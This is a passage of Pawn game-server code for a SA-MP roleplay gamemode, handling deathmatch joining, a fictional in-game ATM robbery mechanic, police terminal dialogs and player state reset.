			        GiveWeaponToPlayer( playerid, 24, 999 );
					GiveWeaponToPlayer( playerid, 25, 999 );
					GiveWeaponToPlayer( playerid, 29, 999 );
					GiveWeaponToPlayer( playerid, 30, 999 );

					SMG_SetPlayerSkin( playerid, 293 );

					tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ]++;

					new tdm_str[ 20 ];
					format( tdm_str, sizeof( tdm_str ), "~b~score:_%03d", tdm_mapInfo[ tdm_ServerMap ][ ctScore ] );
					TextDrawSetString( TDM_gTD[ 17 ], tdm_str );
					format( tdm_str, sizeof( tdm_str ), "~r~score:_%03d", tdm_mapInfo[ tdm_ServerMap ][ ttScore ] );
					TextDrawSetString( TDM_gTD[ 19 ], tdm_str );

					format( tdm_str, sizeof( tdm_str ), "~b~players:_%02d", tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ] );
					TextDrawSetString( TDM_gTD[ 18 ], tdm_str );
					format( tdm_str, sizeof( tdm_str ), "~r~players:_%02d", tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ] );
					TextDrawSetString( TDM_gTD[ 20 ], tdm_str );
			    }

				tdm_player_info[ playerid ][ tdm_Kill ] = 0;
				tdm_player_info[ playerid ][ tdm_KillinaROW ] = 0;
				tdm_player_info[ playerid ][ tdm_Death ] = 0;

				GetPlayerPos( playerid, PozicijaWAR[ playerid ][ 0 ], PozicijaWAR[ playerid ][ 1 ],  PozicijaWAR[ playerid ][ 2 ] );
				VirtualWWAR[ playerid ] = GetPlayerVirtualWorld( playerid );
			 	InteriorWAR[ playerid ] = GetPlayerInterior( playerid );

			    tdmTDControl( playerid, false );
			    SendInfoMessage( playerid, "Da napustis server kucajte {FFFFFF}(/napustitdm)." );
				SendInfoMessage( playerid, "Pricas po defaultu na 'T' bez ikakvih komandi sa suigracima." );

				for( new i = 0; i < 21; i ++) TextDrawShowForPlayer( playerid, TDM_gTD[ i ] );

				new tdm_str[ 40 ];
				format( tdm_str, sizeof( tdm_str ), "your_score:_%02d", PlayerInfo[ playerid ][ xCSTDMScore ] );

				TDMplayerScore_pTD[playerid] = CreatePlayerTextDraw(playerid, 211.566574, 403.148651, tdm_str);
				PlayerTextDrawLetterSize(playerid, TDMplayerScore_pTD[playerid], 0.128665, 0.720592);
				PlayerTextDrawAlignment(playerid, TDMplayerScore_pTD[playerid], 2);
				PlayerTextDrawColor(playerid, TDMplayerScore_pTD[playerid], -1);
				PlayerTextDrawSetShadow(playerid, TDMplayerScore_pTD[playerid], 0);
				PlayerTextDrawSetOutline(playerid, TDMplayerScore_pTD[playerid], 0);
				PlayerTextDrawBackgroundColor(playerid, TDMplayerScore_pTD[playerid], 255);
				PlayerTextDrawFont(playerid, TDMplayerScore_pTD[playerid], 2);
				PlayerTextDrawSetProportional(playerid, TDMplayerScore_pTD[playerid], 1);
				PlayerTextDrawSetShadow(playerid, TDMplayerScore_pTD[playerid], 0);

				PlayerTextDrawShow( playerid, TDMplayerScore_pTD[ playerid ] );
			    return 1;
			}
			if( playertextid == tdm_player_tds[playerid][43] ) // join dm
			{
			    if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Ne mozes ako nisi level 5+." );
				if( PlayerInfo[ playerid ][ xWanted ] > 0 ) return SendErrorMessage( playerid, "Ne mozes na DM sa WLom." );
				if( PoliceDuty[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes sa PD duty na DM server." );
                if( uInterijeru[ playerid ] != Interiors[5] ) return SendErrorMessage( playerid, "Moras biti u igraonici." );

                GetPlayerPos( playerid, PozicijaWAR[ playerid ][ 0 ], PozicijaWAR[ playerid ][ 1 ],  PozicijaWAR[ playerid ][ 2 ] );
				VirtualWWAR[ playerid ] = GetPlayerVirtualWorld( playerid );
			 	InteriorWAR[ playerid ] = GetPlayerInterior( playerid );

				NaDmEventu[ playerid ] = true;
			    new rand = random( sizeof( RandomDMPos ) );
				SMG_SetPlayerPos( playerid, RandomDMPos[ rand ][ 0 ], RandomDMPos[ rand ][ 1 ],RandomDMPos[ rand ][ 2 ] );
				SetPlayerFacingAngle( playerid, 360.000 );
				SetCameraBehindPlayer( playerid );
				SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 10 );

				SetPlayerHealth( playerid, 100 );
				SetPlayerArmour( playerid, 100 );

				if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4500 )
				{
				    SendInfoMessage( playerid, "Usao si na DM sa rankom 10." );
				    GiveWeaponToPlayer( playerid, 24, 150 );
					GiveWeaponToPlayer( playerid, 26, 150 );
					GiveWeaponToPlayer( playerid, 28, 400 );
					GiveWeaponToPlayer( playerid, 31, 400 );
					SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
					SetPlayerSkillLevel( playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, 999 );
				}
				else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4000 )
				{
					SendInfoMessage( playerid, "Usao si na DM sa rankom 9." );
					GiveWeaponToPlayer( playerid, 24, 150 );
					GiveWeaponToPlayer( playerid, 27, 150 );
					GiveWeaponToPlayer( playerid, 32, 800 );
					GiveWeaponToPlayer( playerid, 31, 400 );
					SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
				}
				else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3500 )
				{
					SendInfoMessage( playerid, "Usao si na DM sa rankom 8." );
					GiveWeaponToPlayer( playerid, 24, 150 );
					GiveWeaponToPlayer( playerid, 27, 150 );
					GiveWeaponToPlayer( playerid, 28, 800 );
					GiveWeaponToPlayer( playerid, 31, 400 );
					SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
				}
				else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3000 )
				{
					SendInfoMessage( playerid, "Usao si na DM sa rankom 7." );
					GiveWeaponToPlayer( playerid, 24, 150 );
					GiveWeaponToPlayer( playerid, 27, 150 );
					GiveWeaponToPlayer( playerid, 29, 400 );
					GiveWeaponToPlayer( playerid, 31, 400 );
				}
				else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2500 )
				{
					SendInfoMessage( playerid, "Usao si na DM sa rankom 6." );
					GiveWeaponToPlayer( playerid, 24, 150 );
					GiveWeaponToPlayer( playerid, 26, 150 );
					GiveWeaponToPlayer( playerid, 29, 400 );
					GiveWeaponToPlayer( playerid, 31, 400 );
				}
				else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2000 )
				{
					SendInfoMessage( playerid, "Usao si na DM sa rankom 5." );
					GiveWeaponToPlayer( playerid, 24, 150 );
					GiveWeaponToPlayer( playerid, 26, 150 );
					GiveWeaponToPlayer( playerid, 29, 400 );
					GiveWeaponToPlayer( playerid, 30, 400 );
				}
				else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1500 )
				{
					SendInfoMessage( playerid, "Usao si na DM sa rankom 4." );
					GiveWeaponToPlayer( playerid, 24, 150 );
					GiveWeaponToPlayer( playerid, 25, 100 );
					GiveWeaponToPlayer( playerid, 29, 400 );
					GiveWeaponToPlayer( playerid, 31, 400 );
				}
				else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1000 )
				{
					SendInfoMessage( playerid, "Usao si na DM sa rankom 3." );
					GiveWeaponToPlayer( playerid, 24, 150 );
					GiveWeaponToPlayer( playerid, 25, 100 );
					GiveWeaponToPlayer( playerid, 29, 400 );
					GiveWeaponToPlayer( playerid, 30, 400 );
				}
				else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 500 )
				{
					SendInfoMessage( playerid, "Usao si na DM sa rankom 2." );
					GiveWeaponToPlayer( playerid, 24, 200 );
					GiveWeaponToPlayer( playerid, 25, 100 );
					GiveWeaponToPlayer( playerid, 29, 400 );
				}
				else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 0 )
				{
					SendInfoMessage( playerid, "Usao si na DM sa rankom 1." );
					GiveWeaponToPlayer( playerid, 24, 200 );
					GiveWeaponToPlayer( playerid, 25, 100 );
				}

				SendClientMessage( playerid, ZUTA, "(DM): Da izadjete sa DM-a kucajte {FFFFFF}(/napustidm)." );

			    tdmTDControl( playerid, false );
			    return 1;
			}
			//
			if( playertextid == ATM_pTD[ playerid ][ 15 ] ) // presecanje zica
			{
			    new atmid = GetNearestAtm( playerid );
			    if( atmid == -1 ) return SendErrorMessage( playerid, "Nisi pored bankomata." );
			    if( atmInfo[ atmid ][ atmPreseceneZice ] == true ) return SendErrorMessage( playerid, "Vec su presecene zice." );
	            if( atmInfo[ atmid ][ atmVremeDoRoba ] != 0 ) return SendErrorMessage( playerid, "Ovaj bankomat je vec opljackan." );
	            if( GetWeapon( playerid ) != 4 ) return SendErrorMessage( playerid, "Morate da imate noz u rukama" );

	            _progressatmbar[playerid] = SetPlayerTimerEx(playerid, "RobZiceAtm", 1000, true, "i", playerid);
	            robbingATM[ playerid ] = atmid;
	            robbingATMSeconds[ playerid ] = 95;

	            CancelSelectTextDraw( playerid );
	            SendInfoMessage( playerid, "Poceli ste sa obijanjem bankomata, ne pomerajte se sa svog mesta." );
				return 1;
			}
			if( playertextid == ATM_pTD[ playerid ][ 16 ] ) // ulazak u bios
			{
			    new atmid = GetNearestAtm( playerid );
			    if( !LaptopRuke[ playerid ] ) return SendErrorMessage( playerid, "Nemate laptop u rukama." );
			    if( atmid == -1 ) return SendErrorMessage( playerid, "Nisi pored bankomata." );
			    if( atmInfo[ atmid ][ atmProbijenBios ] == true ) return SendErrorMessage( playerid, "Vec je hakovan ovaj bankomat." );
				if( atmInfo[ atmid ][ atmVremeDoRoba ] != 0 ) return SendErrorMessage( playerid, "Ovaj bankomat je vec opljackan." );

				ATMRobBar_pTD[ playerid ] = CreatePlayerProgressBar( playerid, 229.666717, 294.118621, 195.00, 4.0, 0x4282C0FF, 100.0, BAR_DIRECTION_RIGHT);
	            SetPlayerProgressBarValue( playerid, ATMRobBar_pTD[ playerid ], 0.0 );
	            ShowPlayerProgressBar( playerid, ATMRobBar_pTD[ playerid ] );

				robbingATM[ playerid ] = atmid;
	            atmLoadingTDControl( playerid, true );

	            PlayerTextDrawSetString( playerid, ATMRobLoading_pTD[ playerid ][ 1 ], "0%" );

	            SetPlayerTimerEx(playerid, "ProgresAtmBar", 1000, false, "i", playerid);

	            CancelSelectTextDraw( playerid );
				return 1;
			}
			if( playertextid == ATM_pTD[ playerid ][ 17 ] ) // kradja novca
			{
			    new atmid = GetNearestAtm( playerid );
			    if( atmid == -1 ) return SendErrorMessage( playerid, "Nisi pored bankomata." );
			    if( atmInfo[ atmid ][ atmVremeDoRoba ] != 0 ) return SendErrorMessage( playerid, "Ovaj bankomat je vec opljackan." );
				if( atmInfo[ atmid ][ atmPreseceneZice ] == true )
				{
				    new pokusaj = random(4);
				    if( pokusaj == 1 )
					{
				        KillTimer(_progressatmbar[playerid]);

				        SendInfoMessage( playerid, "Niste uspeli ukrasti novac, alarm se oglasio." );
	                    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 5 );

					    atmInfo[ atmid ][ atmVremeDoRoba ] = 60;
			    		SacuvajATM( atmid );
			    		PlayerInfo[ playerid ][ xPljackaVreme ] = 60;

			    		ATMTDControl( playerid, false );
				    }
				    else
					{
				        KillTimer(_progressatmbar[playerid]);

					    new money = ( random(10000)+50000 );
					    DajIgracuNovac( playerid, money );
  			    		UpdateBankTD( playerid );
					    SendInfoMessage( playerid, "Uspesno ste ukrali iz bankomata $%d.", money );
	                    PostaviWanted( playerid, "Pljacka bankomata", "Nepoznati", 5 );

					    atmInfo[ atmid ][ atmVremeDoRoba ] = 120;
			    		SacuvajATM( atmid );
			    		PlayerInfo[ playerid ][ xPljackaVreme ] = 120;

			    		ATMTDControl( playerid, false );

			    		new q[ 128 ];
						mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `rob_time` = '%d' WHERE `user_id` = '%d' LIMIT 1",
															PlayerInfo[ playerid ][ xPljackaVreme ],
															PlayerInfo[ playerid ][ xID ] );
						mysql_tquery( mSQL, q );
		    		}
				}
				else if( atmInfo[ atmid ][ atmProbijenBios ] == true )
				{
					new pokusaj = random(4);
				    if( pokusaj == 1 )
					{
				        KillTimer(_progressatmbar[playerid]);

				        SendInfoMessage( playerid, "Niste uspeli prebaciti novac na vas racun, sistem zastite bankomata je ponovno podignut." );
	                    PostaviWanted( playerid, "Pokusaj pljacke bankomata", "Nepoznati", 5 );

					    atmInfo[ atmid ][ atmVremeDoRoba ] = 60;
			    		SacuvajATM( atmid );
			    		PlayerInfo[ playerid ][ xPljackaVreme ] = 60;

			    		ATMTDControl( playerid, false );
				    }
				    else
					{
				        KillTimer(_progressatmbar[playerid]);

					    new money = ( random(5000)+10000 );
					    PlayerInfo[ playerid ][ xBRacun ] += money;
                        UpdateBankTD( playerid );
					    SendInfoMessage( playerid, "Uspesno ste sa bankomata prebacili $%d na vas racun.", money );
	                    PostaviWanted( playerid, "Pljacka bankomata", "Nepoznati", 5 );

					    atmInfo[ atmid ][ atmVremeDoRoba ] = 120;
			    		SacuvajATM( atmid );
			    		PlayerInfo[ playerid ][ xPljackaVreme ] = 120;

						ATMTDControl( playerid, false );

	                    new q[ 128 ];
						mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `rob_time` = '%d', `xBRacun` = '%d' WHERE `user_id` = '%d' LIMIT 1",
							PlayerInfo[ playerid ][ xPljackaVreme ],
							PlayerInfo[ playerid ][ xBRacun ],
							PlayerInfo[ playerid ][ xID ] );
						mysql_tquery( mSQL, q );
		    		}
				}
				else return SendErrorMessage( playerid, "Moras prvo da hakujes bankomat ili da mu preseces zice." );
				return 1;
			}
	 	    //
	 	    if( playertextid == Police_TV[ playerid ][ 7 ] )
			{
	 	        ShowPlayerDialog( playerid, dialog_SEARCH_NAME, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}Upisite 'Ime_Prezime' kojega zelite potraziti u bazi podataka:", "Potvrdi", "Odustani" );
	 	        return 1;
	 	    }
	 	    if( playertextid == Police_TV[ playerid ][ 8 ] )
			{
				ShowPlayerDialog( playerid, dialog_SEARCH_NUMBERPLATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}Unesite broj tablice u prazno polje. (bez nula-00 i bez LS(samo broj)):", "Potvrdi", "Odustani" );
	 	        return 1;
	 	    }
	 	    if( playertextid == Police_TV[ playerid ][ 9 ] )
			{
	 	        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	 	        strcat( DialogStrgEx, "{FF0000}** Popis svih zatvorenika **{FFFFFF}\n" );
	            foreach( new i : Player)
				{
					if( PlayerInfo[ i ][ xZatvor ] == JAIL )
			  		{
						format( globalstring, sizeof( globalstring ), "%s\n", ImeIgraca( i ) );
						strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	        	return 1;
	 	    }
	 	    if( playertextid == Police_TV[ playerid ][ 10 ] )
		 	{
	 	        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	 	        strcat( DialogStrgEx, "{FF0000}** Popis svih osumnjicenih **{FFFFFF}\n" );
	            foreach( new i : Player)
				{
					if( PlayerInfo[ i ][ xWanted ] > 0 )
    				{
						format( globalstring, sizeof( globalstring ), "- %s | Wanted Level: %d\n", ImeIgraca( i ), PlayerInfo[ i ][ xWanted ] );
						strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	        	return 1;
	 	    }
	 	    if( playertextid == Police_TV[ playerid ][ 11 ] )
		 	{
	 	    	if(!RequestingBackup[playerid])
			 	{
					format( globalstring, sizeof( globalstring ), "(BACKUP): {FFFFFF}%s {8D8DFF}trazi pojacanje i oznacen je na GPSu(crveno).", ImeIgraca( playerid ) );
					RequestingBackup[playerid] = true;

					foreach( new i : Player)
					{
						if( org_info[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_VLADINA )
						{
							SetPlayerMarkerForPlayer( i, playerid, 0x3333CCAA );
							SendClientMessage( i, 0x8D8DFFFF, globalstring );
						}
					}
					SendClientMessage( playerid, 0x8D8DFF00, "(BACKUP): Kucajte {FFFFFF}[ /bkc ] {8D8DFF}da bi ste izbrisali pojacanje." );
					_backupclear[playerid] = SetPlayerTimerEx(playerid, "BackupClear", 180000, false, "ii", playerid, 1);
				}
				else SendClientMessage( playerid, 0x8D8DFF00, "(BACKUP): Vec imate aktivan zahtev za pojacanje!");
				return 1;
			}
	 	    if( playertextid == Police_TV[ playerid ][ 12 ] )
		 	{
	 	        ShowPlayerDialog( playerid, dialog_OCISTIDOSIJE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}Upisite 'Ime_Prezime':", "Potvrdi", "Odustani" );
	 	        return 1;
			}
	 	    if( playertextid == Police_TV[ playerid ][ 13 ] )
			{
	 	        ShowPlayerDialog( playerid, dialog_POSTAVIPOTERU, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}'Ime_Prezime' i razlog optuzbe:", "Potvrdi", "Odustani" );
	 	        return 1;
	 	    }
		}
 	}
 	return 1;
}
//------------------------------------------------------------------------------
_:public ResetPlayer( playerid )
{
    if( IsValidDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] ) ) DestroyDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] );
    if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] ) ) DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
	if( IsValidDynamicCP(PlayerGpsRadar[ playerid ][_pgrCheckPointId ] ) ) DestroyDynamicCP(PlayerGpsRadar[ playerid ][_pgrCheckPointId] );
    PlayerGpsRadar[ playerid ][_pgrIconId] = -1;
    PlayerGpsRadar[ playerid ][_pgrObject] = -1;
    PlayerGpsRadar[ playerid ][_pgrCheckPointId] = -1;

    Kockanje[playerid][IgraRulet] = false;
    Kockanje[playerid][BrojRulet] = 0;
    Kockanje[playerid][UlogRulet] = 0;
    Kockanje[playerid][IgraKlad] = false;
    Kockanje[playerid][TimKlad] = 0;
    Kockanje[playerid][UlogKlad] = 0;

    LastCar[ playerid ] = 0;
    AlreadyRefreshed[ playerid ] = gettime();

    ALTPoruke[ playerid ] = false;
    StartingVehicle[playerid] = false;
    IgracNosiPaket[ playerid ] = false;
    PlayerFreezed[ playerid ] = true;
    strmid( accountRealPass[ playerid ], "", 0, strlen( "" ), 64 );
    ResetujWarIgraca( playerid );
    ResetTuningInfo( playerid );
    ChosenWeapon[ playerid ] = 0;
    first_spawn[ playerid ] = false;
    clothes_load[ playerid ] = false;
    quests_load[playerid] = false;
    skills_load[playerid] = false;
    Tempomat[ playerid ] = false;
    PlayerCruiseSpeed[ playerid ] = 0.00;
    ChosenPlayerVeh[ playerid ] = -1;
    AdminDialog[ playerid ] = false;
    //
    tdm_player_info[ playerid ][ tdm_Team ] = 0;
	tdm_player_info[ playerid ][ tdm_Kill ] = 0;
	tdm_player_info[ playerid ][ tdm_KillinaROW ] = 0;
	tdm_player_info[ playerid ][ tdm_Death ] = 0;
	//
	EndWood[ playerid ] = 0;
	//
	BikeBH[ playerid ] = 0;
	VehicleOffSaleVehID[ playerid ] = 0;
    //
    KillTimer(Putovar[playerid]);
    KillTimer(Pistovar[playerid]);
	KillTimer(gZone_Timer[playerid]);
    KillTimer(PusenjeTimer[playerid]);
    KillTimer(_progressatmbar[playerid]);
	KillTimer(RentTimer[playerid]);
	KillTimer(DragTimer[playerid]);
	KillTimer(pocetni_intro[playerid]);
	KillTimer(tazovan_tajmer[playerid]);
	KillTimer(TrashTimer[playerid]);
	KillTimer(PilotTimer[playerid]);
	KillTimer(IzazivanjeTimer[playerid]);
	KillTimer(PljackanjeBankeTimer[playerid]);
	KillTimer(PljackanjeZlatareTimer[playerid]);
	KillTimer(rudarPosao[playerid][rudarTimer]);

	#if ZIMSKI_MOD == 1

		KillTimer(action_effect[playerid]);
	 	Snow[ playerid ] = false;

	 	for(new i = 0; i < sizeof(snowStreet); i++) Streamer_ToggleItem(playerid, STREAMER_TYPE_OBJECT, snowStreet[i], false);

    #endif

    //----------------------------------------

    ToggedPM[playerid] = false;
    ToggedWISP[playerid] = false;
    ToggedFR[playerid] = false;

    //----------------------------------------

    BreakingVehicle[playerid] = -1;
	BreakLockTimerCalled[playerid] = 0;
	BreakingLock[playerid] = 0;
	breaksecounds[playerid] = 0;
	immobsecounds[playerid] = 0;

	//----------------[ Enum ]----------------

	PlayerInfo[ playerid ][ xRegistrovan ] = 0;
	PlayerInfo[ playerid ][ xPol ] = 1;
	PlayerInfo[ playerid ][ xGodine ] = 0;
    PlayerInfo[ playerid ][ xNovac ] = 0;
	PlayerInfo[ playerid ][ xLevel ] = 0;
	PlayerInfo[ playerid ][ xRespekt ] = 0;
	PlayerInfo[ playerid ][ xPoboljsanja ] = 0;
	PlayerInfo[ playerid ][ xPayDay ] = 0;
	PlayerInfo[ playerid ][ xAdmin ] = 0;
	PlayerInfo[ playerid ][ xSkin ] = 26;
	PlayerInfo[ playerid ][ xSpawn ] = 0;
	PlayerInfo[ playerid ][ xLider ] = 0;
	PlayerInfo[ playerid ][ xClan ] = 0;
	PlayerInfo[ playerid ][ xKazneniUgovor ] = 0;
	PlayerInfo[ playerid ][ xRank ] = 0;

 	for( new j = 0; j < MAX_VEH_SLOT; j++ )
	{
		player_veh[ playerid ][ vehicle_id ][ j ] = -1;
	}

	PlayerInfo[ playerid ][ xMaterijali ] = 0;
	PlayerInfo[ playerid ][ xBussinesSqlID ] = 0;
	PlayerInfo[ playerid ][ xFirmaID ] = -1;
	PlayerInfo[ playerid ][ xPosao ] = 0;

	clothes_info[ playerid ][ x_slot_1_model ] = -1;
	clothes_info[ playerid ][ x_slot_2_model ] = -1;
	clothes_info[ playerid ][ x_slot_3_model ] = -1;
	clothes_info[ playerid ][ x_slot_4_model ] = -1;
	for( new i = 0; i < 9; i ++ )
	{
	    clothes_info[ playerid ][ x_slot_1_pos ][ i ] = 0;
	    clothes_info[ playerid ][ x_slot_2_pos ][ i ] = 0;
	    clothes_info[ playerid ][ x_slot_3_pos ][ i ] = 0;
	    clothes_info[ playerid ][ x_slot_4_pos ][ i ] = 0;
	}
	for(new i = 0; i < 10; i++) 
	{
	    questInfo[playerid][qt_EasyQuest][i] = false;
	    questInfo[playerid][qt_EasyRewardQuest][i] = false;
	}
    jskInfo[playerid][skill_Mehanicar] = 1;
    jskInfo[playerid][skill_PMunicije] = 1;
   	jskInfo[playerid][skill_Pilot] = 1;
   	jskInfo[playerid][skill_Rudar] = 1;
   	jskInfo[playerid][skill_PNovca] = 1;
   	jskInfo[playerid][skill_PNamjestaja] = 1;
   	jskInfo[playerid][skill_Uber] = 1;

	PlayerInfo[ playerid ][ xStaffMin ] = 0;
	PlayerInfo[ playerid ][ xCigare ] = 0;
	PlayerInfo[ playerid ][ xUpaljac ] = 0;
	PlayerInfo[ playerid ][ xBStil ] = 0;
	PlayerInfo[ playerid ][ xSHealth ] = 0;
	PlayerInfo[ playerid ][ xBrojTelefona ] = 0;
	PlayerInfo[ playerid ][ xVozacka ] = 0;
	PlayerInfo[ playerid ][ xBrodska ] = 0;
	PlayerInfo[ playerid ][ xLetelica ] = 0;
	PlayerInfo[ playerid ][ xUbijen ] = 0;
    PlayerInfo[ playerid ][ xToolkit ] = 0;
    PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ] = 0;
    PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ] = 0;
    PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ] = 0;
    PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1;
    PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1;
    PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1;
    PlayerInfo[ playerid ][ xGunLicense ] = 0;
    PlayerInfo[ playerid ][ xTelefonBon ] = 0;
    PlayerInfo[ playerid ][ xTelefon ] = 0;
    PlayerInfo[ playerid ][ xSnaga ] = 0;
    PlayerInfo[ playerid ][ xZatvor ] = 0;
    PlayerInfo[ playerid ][ xZatvorVreme ] = 0;
    PlayerInfo[ playerid ][ xWanted ] = 0;
    PlayerInfo[ playerid ][ xUhapsen ] = 0;
    PlayerInfo[ playerid ][ xPDUhapsio ] = 0;
    PlayerInfo[ playerid ][ xPDStatsTicket ] = 0;
	PlayerInfo[ playerid ][ xPDStatsTicketMoney ] = 0;
	PlayerInfo[ playerid ][ xTakenWeps ] = 0;
    PlayerInfo[ playerid ][ xTakenDrugs ] = 0;
    PlayerInfo[ playerid ][ xAKod ] = 0;
    PlayerInfo[ playerid ][ xSat ] = 0;
	PlayerInfo[ playerid ][ xBRacun ] = 0;
	PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = 0;
    PlayerInfo[ playerid ][ xIznosRate ] = 0;
    PlayerInfo[ playerid ][ xIznosKredita ] = 0;
    PlayerInfo[ playerid ][ xOnlineSati ] = 0;
    PlayerInfo[ playerid ][ xGamemaster ] = 0;
    PlayerInfo[ playerid ][ xWarn ] = 0;
    PlayerInfo[ playerid ][ xMute ] = gettime();
    PlayerInfo[ playerid ][ xMarker ][ 0 ] = 0.00000;
    PlayerInfo[ playerid ][ xMarker ][ 1 ] = 0.00000;
    PlayerInfo[ playerid ][ xMarker ][ 2 ] = 0.00000;
    PlayerInfo[ playerid ][ xOrgUgovor ] = 0;
	PlayerInfo[ playerid ][ xGpsLevel ] = 1;
	PlayerInfo[ playerid ][ xSpawned ] = 0;
	PlayerInfo[ playerid ][ xSkriptaRank ] = 0;
	PlayerInfo[ playerid ][ xDrzava ] = 0;
	PlayerInfo[ playerid ][ xVIPLevel ] = 0;
	PlayerInfo[playerid][xPromoter] = 0;
	PlayerInfo[playerid][xYouTuber] = 0;
	PlayerInfo[ playerid ][ xHitmenCena ] = 0;
	PlayerInfo[ playerid ][ xMarried ] = 0;
	PlayerInfo[ playerid ][ xSpecAdmin ] = 0;
	PlayerInfo[ playerid ][ xBingoNumber ] = 0;
	PlayerInfo[ playerid ][ xBingoMoney ] = 0;
	PlayerInfo[ playerid ][ xSlotoviVozila ] = 1;
	PlayerInfo[ playerid ][ xLeaveJail ] = 0;
	PlayerInfo[ playerid ][ xHangarTime ] = 0;
	PlayerInfo[ playerid ][ xZauzimanjeVreme ] = 0;
	PlayerInfo[ playerid ][ xSvercer ] = 0;
	PlayerInfo[ playerid ][ xEvent1Mesto ] = 0;
	PlayerInfo[ playerid ][ xEvent2Mesto ] = 0;
	PlayerInfo[ playerid ][ xEvent3Mesto ] = 0;
	PlayerInfo[ playerid ][ xDMEventUbistva ] = 0;
	PlayerInfo[ playerid ][ xCSTDMScore ] = 0;
	PlayerInfo[ playerid ][ xRentID ] = -1;
	PlayerInfo[ playerid ][ xZlato ] = 0;
	PlayerInfo[playerid][xDiamond] = 0;
	PlayerInfo[ playerid ][ xPljackaVreme ] = 0;
	PlayerInfo[ playerid ][ xRobVreme ] = 0;
	PlayerInfo[ playerid ][ xRezervniKljucevi ] = -1;
	PlayerInfo[ playerid ][ xDBoja ] = 0;
	PlayerInfo[ playerid ][ xReactionPoen ] = 0;
    PlayerInfo[ playerid ][ xUPoen ] = 0;
    PlayerInfo[ playerid ][ xTiki ] = 0;
    PlayerInfo[ playerid ][ xVipTime ] = 0;
    PlayerInfo[ playerid ][ xPoklon ] = 0;
    PlayerInfo[ playerid ][ xPaketic ] = 0;
	PlayerInfo[ playerid ][ xDBO ] = 0;
	PlayerInfo[ playerid ][ xAGMStats ] = 0;
    PlayerInfo[ playerid ][ xBoombox ] = false;
    PlayerInfo[ playerid ][ xTorba_Pizza ] = 0;
    PlayerInfo[ playerid ][ xTorba_Sok ] = 0;
    PlayerInfo[ playerid ][ xTorba_Pivo ] = 0;
    PlayerInfo[ playerid ][ xTorba_Hambi ] = 0;
    PlayerInfo[ playerid ][ xTorba_Riba ] = 0;
    PlayerInfo[ playerid ][ xTorba_Laptop ] = false;
    PlayerInfo[ playerid ][ xTorba_Droga ] = 0;
    PlayerInfo[ playerid ][ xTorba_Oruzje ][ 0 ] = 0;
    PlayerInfo[ playerid ][ xTorba_Oruzje ][ 1 ] = 0;
    PlayerInfo[ playerid ][ xTorba_Oruzje ][ 2 ] = 0;
    PlayerInfo[ playerid ][ xTorba_OruzjeM ][ 0 ] = 0;
    PlayerInfo[ playerid ][ xTorba_OruzjeM ][ 1 ] = 0;
    PlayerInfo[ playerid ][ xTorba_OruzjeM ][ 2 ] = 0;
    PlayerInfo[ playerid ][ xTDColor ] = 0;
    PlayerInfo[playerid][xFirework] = 0;
    PlayerInfo[playerid][xAktivnaIgra] = 0;
    PlayerInfo[playerid][xBonPotvrda] = 0;
    PlayerInfo[playerid][xPaysPotvrda] = 0;
    PlayerInfo[playerid][xOglasWarn] = 0;
    PlayerInfo[playerid][xVIPWarn] = 0;
    PlayerInfo[playerid][xTogLabel] = false;
    PlayerInfo[playerid][xDeathLastMSG] = gettime();
    PlayerInfo[playerid][xDeathTime] = gettime();
    PlayerInfo[playerid][xDeathPos][0] = 0.0;
    PlayerInfo[playerid][xDeathPos][1] = 0.0;
    PlayerInfo[playerid][xDeathPos][2] = -10000.0;
    PlayerInfo[playerid][xPoslaoNPoruku] = 0;
    PlayerInfo[playerid][xPoslaoLPoruku] = 0;
